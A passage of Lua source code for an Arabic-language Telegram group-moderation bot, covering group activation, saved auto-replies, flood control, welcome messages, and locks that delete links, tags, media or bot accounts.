local pattern = string.format("([^%s]+)", sep)
self:gsub(pattern, function(c) fields[#fields+1] = c end)
return fields
end
function faedr(msg,data) 
local msg = data.message_
local text = msg.content_.text_
local caption = msg.content_.caption_
if text ==('تفعيل') and not is_admin(msg.sender_user_id_, msg.chat_id_) and not botx1:get(BOT..'lock:bot:free'..bot_id) then
function adding(extra,result,success)
local function promote_admin(extra, result, success)
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
botx1:sadd(BOT..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
botx1:sadd(BOT.."bot:monsh:"..msg.chat_id_,owner_id)
end end end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if botx1:get(BOT.."bot:enable:"..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل المجموعه سابقا •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '☑️ ⁞ تم تفعيل المجموعه •\n📬 ⁞ تم ترفع منشئ المجموعه •\n📨 ⁞ تم رفع ادمنيه المجموعه •', 1, 'md')
openChat(msg.chat_id_,bot)
botx1:sadd("bot:addg"..bot_id, msg.chat_id_)
function bot(f1,f2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
botx1:set(BOT.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
botdx(tostring((botx1:get(BOT.."bot:leader:gr") or bot_owner)), 0, 1, "🌿╿❯ تم تفعيل مجموعه جديده • \n🍄┊❯ ايدي الضافني ~ {"..msg.sender_user_id_.."}\n💥┊❯ معرف الضافني ~ @"..(result.username_ or "لا يوجد").."\n✨┊❯ معلومات المجموعه • \n\n📂┊❯ ايدي المجموعه ~ {"..msg.chat_id_.."}\n📍┊❯ اسم المجموعه • {"..f2.title_.."}\n☑️┊❯ رابط المجموعه •\n🚠╽❯  {"..(t2.invite_link_ or "Error").."}" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,bot) 
botx1:set(BOT.."bot:enable:"..msg.chat_id_,true)
botx1:setex(BOT.."bot:charge:"..msg.chat_id_,86400,true)
botx1:sadd("bot:addg"..bot_id, msg.chat_id_)
end end
getUser(msg.sender_user_id_,adding) 
end end
-------------------------------------bot
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
--vardump(data)
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
faedr(data.message_,data) 
----------------OLD MSG--------------------faedee
if msg.date_ < (os.time() - 30) then
print("**** OLD MSG ****")
return false
end
-------* Expire & AutoLeave *-------
---------* Secretary *-----------bot
if botx1:get(BOT.."clerk") == "On" then
function clerk(extra, result, success)
local id = tostring(msg.chat_id_)
if id:match("^(%d+)") then
if not is_admin(msg.sender_user_id_) then
local text = botx1:get(BOT.."textsec")
if not botx1:get(BOT.."secretary:"..msg.chat_id_) then
if text then
local text = text:gsub('FIRSTNAME',(result.first_name_ or ''))
local text = text:gsub('LASTNAME',(result.last_name_ or ''))
local text = text:gsub('USERNAME',('@'..result.username_ or ''))
local text = text:gsub('USERID',(result.id_ or ''))
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
botx1:setex(BOT.."secretary:"..msg.chat_id_,86400,true)
return false
else
return ""
end
end
end
end
end
getUser(msg.sender_user_id_,clerk)
end
-------------------------------------------bot
local idf = tostring(msg.chat_id_)
if not botx1:get(BOT.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_admin(msg.sender_user_id_, msg.chat_id_) then
print("Return False [ Not Enable ]")
return false
end
-------------------------------------------bot
if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
function get_mymsg_contact(extra, result, success)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
return
end
-------------------------------------------bot
botx1:incr(BOT.."bot:allmsgs")
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match('-100(%d+)') then
if not botx1:sismember(BOT.."bot:groups",msg.chat_id_) then
botx1:sadd(BOT.."bot:groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
if not botx1:sismember(BOT.."bot:userss",msg.chat_id_) then
botx1:sadd(BOT.."bot:userss",msg.chat_id_)
end
else
if not botx1:sismember(BOT.."bot:groups",msg.chat_id_) then
botx1:sadd(BOT.."bot:groups",msg.chat_id_)
end
end
end
-------------* MSG TYPES *-----------------bot
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end
-------------------------bot
if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
-------------------------------------
 if msg.content_.ID == "MessageChatAddMembers" then
botx1:incr(BOT..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessagePhoto" then
botx1:incr(BOT.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageAnimation" then
botx1:incr(BOT.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVideo" then
botx1:incr(BOT.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVoice" then
botx1:incr(BOT.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageSticker" then
botx1:incr(BOT.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
-------------------------bot
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(BOT) then 
botx1:srem("bot:addg"..bot_id, msg.chat_id_) 
botx1:del(BOT.."bot:charge:"..msg.chat_id_)
function bot(extra,result,success) 
function  reslit(f1,f2)
function dl_cb222(t1,t2)
botdx(tostring((botx1:get(BOT.."bot:leader:gr") or bot_owner)), 0, 1, "🌿╿❯ تم طرد البوت من مجموعه • \n🍄┊❯ ايدي العضو ~ {"..msg.sender_user_id_.."}\n💥┊❯ معرف العضو ~ @"..(result.username_ or "لا يوجد").."\n✨┊❯ معلومات المجموعه • \n\n📂┊❯ ايدي المجموعه ~ {"..msg.chat_id_.."}\n📍┊❯ اسم المجموعه • {"..f2.title_.."}\n☑️╽❯ { تم مسح جميع بياناتها }" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_, reslit) 
end
getUser(msg.sender_user_id_, bot)
end
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
-------------------------bot
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Add ]")
msg_type = 'MSG:NewUserAdd'
end
-----------------------------------bot
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
-------------------------bot
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
-------------------------bot
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
-------------------------bot
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
-------------------------bot
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
-------------------------bot
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
-------------------------faedee
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
-------------------------bot
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By link ]")
msg_type = 'MSG:NewUser'
end
-------------------------bot
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
-------------------------bot
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
msg_type = 'MSG:JoinByLink'
end
-------------------------bot
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end
-------------------------
end
-------------------------------------------bot
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
-------------------------------------bot----------------------------------------------------------
if msg.content_.photo_ then
if botx1:get(BOT..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تغيير صوره المجموعه •\n', 1, 'md') 
botx1:del(BOT..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
setphoto(msg.chat_id_, photo_id)
end end
------------
text = msg.content_.text_ if msg.content_.text_ or msg.content_.video_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ then 
local content_text = botx1:get(BOT..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'save_repgp' then botx1:del(BOT..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
local content_text = botx1:get(BOT..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then botx1:set(BOT..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.sticker_ then botx1:set(BOT..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then botx1:set(BOT..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.animation_ then botx1:set(BOT..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
botx1:set(BOT..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
end 
botx1:sadd('rep_owner'..msg.chat_id_..'',content_text) 
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حفظ الرد •\n', 1, 'md') 
botx1:del(BOT..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not botx1:get(BOT..'lock_reeeep'..msg.chat_id_) then 
if botx1:get(BOT..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, botx1:get(BOT..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if botx1:get(BOT..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, botx1:get(BOT..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if botx1:get(BOT..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, botx1:get(BOT..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if botx1:get(BOT..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, botx1:get(BOT..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
end
if botx1:get(BOT..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
botdx(msg.chat_id_, msg.id_, 1, botx1:get(BOT..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') , 1, 'md') 
end end
text = msg.content_.text_
if msg.content_.text_  or msg.content_.video_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ then
local content_text = botx1:get(BOT.."add:repallt"..msg.sender_user_id_)
if content_text == 'save_rep' then
botx1:del(BOT.."add:repallt"..msg.sender_user_id_)
local content_text = botx1:get(BOT.."addreply2:"..msg.sender_user_id_)
if msg.content_.video_ then
botx1:set(BOT.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.sticker_ then
botx1:set(BOT.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
botx1:set(BOT.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.animation_ then
botx1:set(BOT.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
botx1:set(BOT.."text_repall"..content_text, msg.content_.text_)
end 
botx1:sadd('rep_sudo',content_text)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حفظ الرد •\n', 1, 'md') 
botx1:del(BOT.."addreply2:"..msg.sender_user_id_)
return false end end
if msg.content_.text_ and not botx1:get(BOT..'lock_reeeep'..msg.chat_id_) then
if botx1:get(BOT.."video_repall"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, botx1:get(BOT.."video_repall"..msg.content_.text_))
end
if botx1:get(BOT.."voice_repall"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, botx1:get(BOT.."voice_repall"..msg.content_.text_))
end
if  botx1:get(BOT.."gif_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, botx1:get(BOT.."gif_repall"..msg.content_.text_))
end
if botx1:get(BOT.."stecker_repall"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, botx1:get(BOT.."stecker_repall"..msg.content_.text_))
end
if botx1:get(BOT.."text_repall"..msg.content_.text_) then
botdx(msg.chat_id_, msg.id_, 1, botx1:get(BOT.."text_repall"..msg.content_.text_) ,  1, "md")
end
end 
-- end functions bot --
----------------------------------------Anti FLood---------------------------------------------
--------------Flood Max --------------bot
local flmax = 'flood:max:'..msg.chat_id_
if not botx1:get(BOT..flmax) then
floodMax = 5
else
floodMax = tonumber(botx1:get(BOT..flmax))
end
-----------------End-------------------
-----------------Msg-------------------bot
local pm = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not botx1:get(BOT..pm) then
msgs = 0
else
msgs = tonumber(botx1:get(BOT..pm))
end
-----------------End-------------------
------------Flood Check Time-----------
local TIME_CHECK = 2
-----------------End-------------------
-------------Flood Check---------------bot
local hashflood = 'anti-flood:'..msg.chat_id_
if msgs > (floodMax - 1) then
if botx1:get(BOT..'floodstatus'..msg.chat_id_) == 'Kicked' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
elseif botx1:get(BOT..'floodstatus'..msg.chat_id_) == 'DelMsg' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
else
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
end
end
-----------------End-------------------
local sendbot = function(chat_id, reply_to_message_id, text, offset, length, userid)
tdcli_function({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = 1,
clear_draft_ = 0,
entities_ = {
[0] = {
ID = "MessageEntityMentionName",
offset_ = offset,
length_ = length,
user_id_ = userid
}
}
}
}, dl_cb, nil)
end
--------------ANTI ATTACK-------------bot
local pmonpv = 'antiattack:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not botx1:get(BOT..pmonpv) then
msgsonpv = 0
else
msgsonpv = tonumber(botx1:get(BOT..pmonpv))
end
if msgsonpv > (13 - 1) then
blockUser(msg.sender_user_id_)
end
local idmem = tostring(msg.chat_id_)
if idmem:match("^(%d+)") then
botx1:setex(BOT..pmonpv, TIME_CHECK, msgsonpv+1)
end
-------------------------------------- Process mod --------------------------------------------
local check_username = function(extra, result, success)
local fname = result.first_name_ or ""
local lname = result.last_name_ or ""
local name = fname .. " " .. lname
local username = result.username_
local svuser = "user:Name" .. result.id_
local id = result.id_
if username then
botx1:set(BOT..svuser, "@" .. username)
else
botx1:set(BOT..svuser, name)
end
end
getUser(msg.sender_user_id_, check_username)
-----------------------------******** START MSG CHECKS BOT ********----------------------------------------
-----------------------------------bot--------------------------------------------------------------------
if is_banned(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
return
end
if is_muted(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
if is_gbanned(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(chat,msgs)
return
end
if botx1:get(BOT..'bot:muteall'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end 
botx1:incr(BOT..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
botx1:incr(BOT..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
botx1:incr(BOT..'group:msgs'..msg.chat_id_)
if msg.content_.ID == "MessagePinMessage" then
if botx1:get(BOT..'pinnedmsg'..msg.chat_id_) and botx1:get(BOT..'bot:pin:mute'..msg.chat_id_) then
unpinmsg(msg.chat_id_)
local pin_id = botx1:get(BOT..'pinnedmsg'..msg.chat_id_)
pinmsg(msg.chat_id_,pin_id,0)
end
end
if botx1:get(BOT..'bot:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
end
botx1:del(BOT..'bot:viewget'..msg.sender_user_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ The more hits you : '..msg.views_..' seen •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ مشاهدات المنشور • '..msg.views_..' تقريبا •', 1, 'md')
end
botx1:del(BOT..'bot:viewget'..msg.sender_user_id_)
end
end
--Photo
--Photo
------- --- Photo--------- bot
-- -----------------Photo
--Photo
--Photo
if msg_type == 'MSG:Photo' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Photo]")
end
end
end
if botx1:get(BOT..'bot:photo:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Photo]")
if botx1:get(BOT..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if botx1:get(BOT..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Photo]")
end
end
if msg.content_.caption_:match("#") then
if botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Photo]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Photo]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Photo]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Photo]")
end
end
end
end
--Markdown
--Markdown
------- --- Markdown---------faedee
-- -----------------Markdown
--Markdown
--Markdown
elseif msg_type == 'MSG:MarkDown' then
if botx1:get(BOT..'markdown:lock'..msg.chat_id_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
--Document
--Document
------- --- Document--------- bot
-- -----------------Document
--Document
--Document
elseif msg_type == 'MSG:Document' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Document]")
end
end
end
if botx1:get(BOT..'bot:document:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Document]")
if botx1:get(BOT..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if botx1:get(BOT..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Document]")
end
end
if msg.content_.caption_:match("#") then
if botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Document]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Document]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Document]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Document]")
end
end
end
end
--Inline
--Inline
------- --- Inline---------bot
-- -----------------Inline
--Inline
--Inline
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
if botx1:get(BOT..'bot:inline:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Inline]")
end
end
--Sticker
--Sticker
------- --- Sticker---------bot
-- -----------------Sticker
--Sticker
--Sticker
elseif msg_type == 'MSG:Sticker' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
if botx1:get(BOT..'bot:sticker:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Sticker]")
end
end
elseif msg_type == 'MSG:JoinByLink' then
if botx1:get(BOT..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_ 
 delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
if botx1:get(BOT..'welcome:'..msg.chat_id_) then
text = botx1:get(BOT..'welcome:'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = 'Hi {firstname} Welcome To Group 🌹'
else
text = '📱⁞ اهلا بك عزيزي •  {firstname}\n📚⁞ معرفك @{username} •\n🥀⁞ التزم بالقوانين لتجنب الطرد •'
end
end
local text = text:gsub('{firstname}',(result.first_name_ or ''))
local text = text:gsub('{lastname}',(result.last_name_ or ''))
local text = text:gsub('{username}',(result.username_ or ''))
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if botx1:get(BOT.."bot:welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--New User Add
--New User Add
------- --- New User Add---------bot
-- -----------------New User Add
--New User Add
--New User Add
elseif msg_type == 'MSG:NewUserAdd' then
if botx1:get(BOT..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
local list = msg.content_.members_
for i = 0, #list do
if list[i].type_.ID == "UserTypeBot" and not is_vipmem(list[i].id_, msg.chat_id_) and botx1:get(BOT.."bot:bots:mute" .. msg.chat_id_) then
chat_kick(msg.chat_id_, list[i].id_)
end
if list[i].type_.ID == "UserTypeBot" and not is_vipmem(list[i].id_, msg.chat_id_) and botx1:get(BOT.."bot:bots:ban" .. msg.chat_id_) then
chat_kick(msg.chat_id_, list[i].id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
if list[i].type_.ID == "UserTypeBot" and not is_vipmem(list[i].id_, msg.chat_id_) and botx1:get(BOT.."keed_bots"..msg.chat_id_) then
chat_kick(msg.chat_id_, list[i].id_)
botx1:sadd(BOT..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
botx1:sadd(BOT..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
end
end  
end
if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
if not is_momod(msg.content_.members_[0].id_, msg.chat_id_) then
if botx1:get(BOT..'bot:bots:gkgk'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
end
end
